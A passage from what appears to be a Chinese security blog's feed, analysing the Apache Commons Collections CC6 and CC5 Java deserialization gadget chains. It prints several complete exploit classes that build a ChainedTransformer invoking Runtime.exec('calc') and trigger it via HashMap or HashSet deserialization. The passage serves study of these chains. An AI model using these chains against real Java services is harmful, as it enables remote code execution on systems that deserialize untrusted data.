value = getValue();</span><br><span class="line">       return (getKey() == null ? 0 : getKey().hashCode()) ^</span><br><span class="line">              (value == null ? 0 : value.hashCode()); </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="hashMap"><a href="#hashMap" class="headerlink" title="hashMap"></a>hashMap</h1><p>方式二：是通过反射先从hashSet集合中获取map属性所指向的hashmap对象，然后再从hashmap中获取table属性中的Node对象，最后将Node对象中的key属性修改为TiedMapEntry对象，Node为啥能接收Entry？这明明是两个完全不同类型的对象，如果你对于HashMap底层实现非常了解的话，相信这一点对你来说应该不难理解，其实主要是因为Node实现了Entry接口。</p><img src="/2023/03/29/CC6/20210725103203148.png" class="" title="img"><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> Gadget chain:</span><br><span class="line"> java.io.ObjectInputStream.readObject()</span><br><span class="line"> java.util.HashMap.readObject()</span><br><span class="line"> java.util.HashMap.hash()</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line"> org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line"> java.lang.reflect.Method.invoke()</span><br><span class="line"> java.lang.Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>readObject,s就是put方法进去的key,value</p><img src="/2023/03/29/CC6/image-20230402204324218.png" class="" title="image-20230402204324218"><p>hashMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FinalCC6EXP</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;five&quot;</span>)); <span class="comment">// 防止在反序列化前弹计算器</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在 put 之后通过反射修改值</span></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line"> <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">         factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">         factoryField.set(lazyMapClass, chainedTransformer);</span><br><span class="line"></span><br><span class="line">         serialize(expMap);</span><br><span class="line">         unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">                Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                        ),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                        ),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">                        )</span><br><span class="line">                &#125;;</span><br><span class="line">                Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">                <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">                <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;feng1&quot;</span>);</span><br><span class="line">                <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                expMap.put(tiedMapEntry,<span class="string">&quot;feng2&quot;</span>);</span><br><span class="line"></span><br><span class="line">                outerMap.remove(<span class="string">&quot;feng1&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>);</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                field.set(chainedTransformer,transformers);</span><br><span class="line">                <span class="type">byte</span>[] bytes = serialize(expMap);</span><br><span class="line">                unserialize(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">                <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">                    <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">                        oin.readObject();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">                <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                    <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">                        oout.writeObject(o);</span><br><span class="line">                        <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="hashSet"><a href="#hashSet" class="headerlink" title="hashSet"></a>hashSet</h1><p>ysoserial</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    by @matthias_kaiser</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>参考<a href="https://blog.csdn.net/qq_35733751/article/details/119077706">(118条消息) 11-java安全——java反序列化CC5和CC6链分析_cc6原理_songly_的博客-CSDN博客</a></p><p>利用链构造完了，接下来需要找到一个触发利用链的地方（重写了readObject方法同时又调用了put方法的地方），正好有一个HashSet集合满足条件，hashSet重写了writeObject和readObject方法实现自定义序列化与<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a></p><p>writeObject方法中会将hashSet集合中的元素依次取出来序列化，readObject方法会判断当前HashSet对象是否为LinkedHashSet，如果不是则直接返回HashMap，接着从流中读取hashSet集合中的元素并还原成java对象，然后将java对象作为参数key传给put方法，自定义序列化和反序列化过程中的hashSet集合中的元素是可控的，如果在hashSet集合中添加TiedMapEntry对象元素，这样就能控制put方法中的key了。</p><p>分析hashSet集合add方法底层实现后发现add方法底层调用了map.put方法，并且在putVal方法内部将key传给了Node。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">返回到putVal方法中，该方法会将Node对象（key/value键值对）赋给一个Node&lt;K,V&gt;[]类型的tab数组（tab实际上是由resize方法返回的table属性引用），即HashMap的table属性，因为hashSet集合添加元素底层用到了HashMap集合，而HashMap会把元素以Node进行存储。</span><br><span class="line"></span><br><span class="line">经过分析之后发现hashSet集合的add方法底层还是调用了map.put方法，控制put方法中的参数key的思路有两种：</span><br><span class="line"></span><br><span class="line">方式一：往hashSet集合中直接添加TiedMapEntry对象。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cc;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    方式一：往hashSet集合中直接添加TiedMapEntry对象。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"> </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap, chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="comment">//直接向Set集合中添加TiedMapEntry，触发利用链</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line"> </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser2.out&quot;</span>));</span><br><span class="line">        outputStream.writeObject(hashSet);</span><br><span class="line">        outputStream.close();</span><br><span class="line"> </span><br><span class="line">        ObjectInputStream inputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser2.out&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt; CC1 链的时候要求是比较严格的。要求的环境为&lt;code&gt;jdk8u65&lt;/code&gt;与&lt;code</summary>
      
    
    
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>CC5</title>
    <link href="http://example.com/2023/03/27/CC5/"/>
    <id>http://example.com/2023/03/27/CC5/</id>
    <published>2023-03-27T13:44:27.000Z</published>
    <updated>2023-03-29T08:14:21.235Z</updated>
    
    <content type="html"><![CDATA[<p>在分析CC5前看下CC1的lazymap链子</p><img src="/2023/03/27/CC5/1623075894_60be2c3691871913b637d.png!small" class="" title="1623075894_60be2c3691871913b637d.png!small?1623075895996"><p>CC5在第五步后与CC1完全一样</p><h1 id="lazymap"><a href="#lazymap" class="headerlink" title="lazymap"></a>lazymap</h1><p>构造方法有两个对我们有用的是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">       <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">       <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">           <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);<span class="comment">//调用了transform ，factory传入我们构造的Transformer[]</span></span><br><span class="line">           map.put(key, value);</span><br><span class="line">           <span class="keyword">return</span> value;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> map.get(key);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="分析TiedMapEntry"><a href="#分析TiedMapEntry" class="headerlink" title="分析TiedMapEntry"></a>分析TiedMapEntry</h1><p>先看下TiedMapEntry中如何调用的get()</p><p>本类中有个toString()方法调用了getValue()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而getValue()中调用了get()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再通过构造器将map赋为LazyMap即可回到CC1的后半部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" 